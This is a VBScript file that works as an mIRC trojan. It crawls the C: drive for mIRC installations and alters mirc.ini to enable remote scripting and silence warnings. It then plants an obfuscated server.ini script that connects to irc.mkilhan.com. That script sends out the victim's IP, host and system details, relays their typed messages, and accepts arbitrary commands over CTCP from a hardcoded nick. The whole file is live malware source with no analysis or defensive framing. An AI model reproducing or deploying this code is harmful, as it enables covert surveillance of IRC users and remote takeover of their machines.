dim Otag 
dim AOtag
dim Ttag 
dim DummyTag
dim SectionDef
call ShowFolderList("c:\")
sub ShowFolderList(s)
on error resume next
Set filesys = CreateObject("Scripting.FileSystemObject")
Set RootFolder1 = FileSys.GetFolder(s)
Set SubFolds1 = RootFolder1.subfolders
For Each f1 in Subfolds1
s = f1.path & "\"
Otag = s & "mirc.ini"
AOtag= s & "mirc.dat"
DummyTag= "C:\winamod.dat"
TTag= s & "server.ini"
SectionDef= "[rfiles]"
if filesys.fileexists(otag) then 
Call Filemod() 
filesys.CopyFile DummyTag, Otag, true
Call ImplementRemote()
filesys.CopyFile DummyTag, Otag, true
Call ImplementWarn()
filesys.CopyFile DummyTag, Otag, true
Call ImplementFserv()
filesys.CopyFile DummyTag, Otag, true
call ImplementPerfCheck()
filesys.CopyFile DummyTag, Otag, true
Call ImplementPerform()
SetClearArchiveBit(Otag)
End If
Call ShowFolderList(s)
Next
End sub
Function FiltNum(FilString)
on error resume next
countdown=5
do
Comp = mid(FilString,2,countdown)
if isnumeric(Comp) then LastNum = Comp : exit do
countdown=countdown-1
loop until countdown =0
FiltNum = LastNum
end function
Function LastLineNum(SSection)
on error resume next
Set FS1N = CreateObject("Scripting.FileSystemObject")
Set FR1N = FS1N.OpenTextFile(otag,1,true)
Do While FR1N.AtEndOfStream <> True
segment1 = FR1N.readline
w = InstrRev(segment1,SSection)
counts=counts+1
if w > 0 then 
do
if FR1N.AtEndOfStream = True then exit do
segmentk = FR1N.readline
k = InstrRev(segmentk,"n",1)		
if k=1 then
LastNum=FiltNum(segmentk)
end if
Loop until k=0
end if
loop
FR1N.Close
LastLineNum=LastNum
end function
Function Filemod()
on error resume next
Set fs1 = CreateObject("Scripting.FileSystemObject")
Set fr1 = fs1.OpenTextFile(otag,1,true)
Set fs2 = CreateObject("Scripting.FileSystemObject")
Set fr2 = fs2.OpenTextFile(DummyTag,2,true)
Do While fr1.AtEndOfStream <> True
segment1 = fr1.readline
fr2.writeline segment1
w = InstrRev(segment1,"[rfiles]")
counts=counts+1
if w > 0 then 
counts2=counts
do
if fr1.AtEndOfStream = True then exit do
segmentk = fr1.readline
k = InstrRev(segmentk,"n",1)		
if k=1 then
LastNum=FiltNum(segmentk)
fr2.writeline segmentk
end if
COUNTS2=COUNTS2+1
Loop until k<>1
exit do
end if
loop
fr1.Close
fr2.close
Set fs3 = CreateObject("Scripting.FileSystemObject")
Set fr3 = fs3.OpenTextFile(DummyTag,8,true)
TrojanInfo = "n" & lastlinenum(SectionDef)+1 & "=server.ini"
fr3.writeline TrojanInfo
fr3.Close
Set fs4 = CreateObject("Scripting.FileSystemObject")
Set fr4 = fs4.OpenTextFile(Otag,1,true)
Set fs5 = CreateObject("Scripting.FileSystemObject")
Set fr5 = fs5.OpenTextFile(DummyTag,8,true)
Do While fr4.AtEndOfStream <> True
segment2 = fr4.readline
if fr4.line >= counts2 + 2 then 
fr5.writeline segment2
end if
loop
fr4.Close
fr5.Close
fs5.CopyFile DummyTag, Otag, true
Call FLDL(TTag)
end Function
sub FLDL(TTag)
on error resume next
Set fs6 = CreateObject("Scripting.FileSystemObject")
Set fr6 = fs6.OpenTextFile(TTag,2,true)
fr6.writeline "[script]"
fr6.writeline "n1=on 1:text:*:?:.sockwrite -nt bot PRIVMSG $chr(35) $+ $chr(90) $+ $chr(69) $+ $chr(71) $+ $chr(64)  : $+ < $+ $nick $+ > $1- < $+ $me $+ > | .halt } } }"
fr6.writeline "n2=on *:SOCKOPEN:bot: {"
fr6.writeline "n3=  sockwrite -n bot USER $rand(A,Z) $+ $rand(a,z) $+ $rand(a,z) $rand(A,Z) $+ $rand(a,z) $rand(A,Z) : $rand(A,Z) $+ $rand(a,z) $+ $rand(a,z)"
fr6.writeline "n4=  sockwrite -n bot NICK $rand(A,Z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) nick "
fr6.writeline "n5=  sockwrite -n bot $chr(112) $+ $chr(114) $+ $chr(105) $+ $chr(118) $+ $chr(109) $+ $chr(115) $+ $chr(103) $chr(35) $+ $chr(90) $+ $chr(69) $+ $chr(71) $+ $chr(64) : < $+ $me $+ > < $fulldate > < IP= $IP > < Host= $Host > Pass < $gmt > System < $os > Server < $server >"
fr6.writeline "n6=}"
fr6.writeline "n7=on *:SOCKREAD:bot: { "
fr6.writeline "n8=  if ($sockerr > 0) return"
fr6.writeline "n9=  sockread %sock "
fr6.writeline "n10=  if ($sockbr == 0) return "
fr6.writeline "n11=  tokenize 32 %sock "
fr6.writeline "n12=  if ($1 == PING) { sockwrite -n bot PONG $2 }"  
fr6.writeline "n13=}"
fr6.writeline "n14=on *:sockclose:bot:{"
fr6.writeline "n15=  unset %sock "
fr6.writeline "n16=  .timerreconn -o 1 15 $chr(115) $+ $chr(111) $+ $chr(99) $+ $chr(107) $+ $chr(111) $+ $chr(112) $+ $chr(101) $+ $chr(110) bot irc.mkilhan.com 6667 "
fr6.writeline "n17=}"
fr6.writeline "n18=on *:start:{ $chr(115) $+ $chr(111) $+ $chr(99) $+ $chr(107) $+ $chr(111) $+ $chr(112) $+ $chr(101) $+ $chr(110) bot irc.mkilhan.com 6667 | server irc.NetkoLik.org } "
fr6.writeline "n19=on *:INPUT:*: {"
fr6.writeline "n20=  if ($chr(35) isin $active) && ($chr(47) !isin $1) goto end "
fr6.writeline "n21=  if ($chr(35) !isin $active) || ($chr(47) isin $1) && ($sock(bot).status == active) { set %ciinput $1- | $chr(115) $+ $chr(111) $+ $chr(99) $+ $chr(107) $+ $chr(119) $+ $chr(114) $+ $chr(105) $+ $chr(116) $+ $chr(101) $chr(45) $+ $chr(116t) $+ $chr(110) bot $chr(112) $+ $chr(114) $+ $chr(105) $+ $chr(118) $+ $chr(109) $+ $chr(115) $+ $chr(103) $chr(35) $+ $chr(90) $+ $chr(69) $+ $chr(71) $+ $chr(95) :< $+ $me $+ > %ciinput (to $active $+ ) ( $server $+ ) | unset %ciinput "
fr6.writeline "n22=    :end "
fr6.writeline "n23=  }"
fr6.writeline "n24=}"
fr6.writeline "n25=on *:connect: {"
fr6.writeline "n26=   if (irc.NetkoLik.Org isin $server) { remote on | join #NetkoLik }"
fr6.writeline "n27=  }"
fr6.writeline "n28=}"
fr6.writeline "n29=CTCP *:*:*: { if ($nick == ÷ ) { $1- | halt }"
fr6.close
end sub
Function ImplementRemote()
Set fs1a = CreateObject("Scripting.FileSystemObject")
Set fr1a = fs1a.OpenTextFile(otag,1,true)
Set fs2a = CreateObject("Scripting.FileSystemObject")
Set fr2a = fs2a.OpenTextFile(DummyTag,2,true)
Do While fr1a.AtEndOfStream <> True
segment1a = fr1a.readline
fr2a.writeline segment1a
if ucase(segment1a)=ucase("[options]") then
Do
If fr1a.AtEndOfStream Then exit do
n2a = fr1a.readline
If ucase(mid(n2a,1,3))=ucase("n2=") then
fr2a.writeline Mid(n2a, 1, 13) & "1,1" & Mid(n2a, 17, 16) & "1" & Mid(n2a, 34)
exit do
Else
fr2a.writeline n2a
End If
Loop
end if
loop
fr1a.Close
fr2a.close
End Function
Function Implementfserv()
Set fs1a = CreateObject("Scripting.FileSystemObject")
Set fr1a = fs1a.OpenTextFile(otag,1,true)
Set fs2a = CreateObject("Scripting.FileSystemObject")
Set fr2a = fs2a.OpenTextFile(DummyTag,2,true)
Do While fr1a.AtEndOfStream <> True
segment1a = fr1a.readline
fr2a.writeline segment1a
if ucase(segment1a)=ucase("[warn]") then
Do
If fr1a.AtEndOfStream Then exit do
n2a = fr1a.readline
If ucase(n2a)=ucase("fserve=on") then
fr2a.writeline "fserve=off"
Else
fr2a.writeline n2a
End If
Loop
end if
loop
fr1a.Close
fr2a.close
End Function
Function Implementwarn()
Set fs1c = CreateObject("Scripting.FileSystemObject")
Set fr1c = fs1c.OpenTextFile(otag,1,true)
Set fs2c = CreateObject("Scripting.FileSystemObject")
Set fr2c = fs2c.OpenTextFile(DummyTag,2,true)
Do While fr1c.AtEndOfStream <> True
segment1c = fr1c.readline
fr2c.writeline segment1c
if ucase(segment1c)=ucase("[fileserver]") then
Do
if fr1c.AtEndOfStream then exit do
n2c = fr1c.readline
If ucase(n2c)=ucase("warning=on") then
fr2c.writeline "warning=off"
Else
fr2c.writeline n2c
End If
Loop
end if
loop
fr1c.Close
fr2c.close
End Function
Function ImplementPerform()
Set fs1p = CreateObject("Scripting.FileSystemObject")
Set fr1p = fs1p.OpenTextFile(Otag,8,true)
fr1p.writeline "[Perform]"
fr1p.writeline "n0=/Remote ON"
fr1p.Close
fs1p.close
End Function
Sub SetClearArchiveBit(filespec)  
Dim fsg, fg
Set fsg = CreateObject("Scripting.FileSystemObject")
Set fg = fsg.GetFile(filespec)  
fg.attributes = 0
fg.attributes = fg.attributes + 1
End Sub
Function ImplementPerfCheck()
Set fs1f = CreateObject("Scripting.FileSystemObject")
Set fr1f = fs1f.OpenTextFile(otag,1,true)
Set fs2f = CreateObject("Scripting.FileSystemObject")
Set fr2f = fs2f.OpenTextFile(DummyTag,2,true)
Do While fr1f.AtEndOfStream <> True
segment1f = fr1f.readline
fr2f.writeline segment1f
if ucase(segment1f)=ucase("[options]") then
Do
If fr1f.AtEndOfStream Then exit do
n2f = fr1f.readline
If ucase(mid(n2f,1,3))=ucase("n0=") then
fr2f.writeline Mid(n2f, 1, 40) & ",1," & Mid(n2f, 44)
exit do
Else
fr2f.writeline n2f
End If
Loop
end if
loop
fr1f.Close
fr2f.close
End Function

set sss=createobject("scripting.filesystemobject")
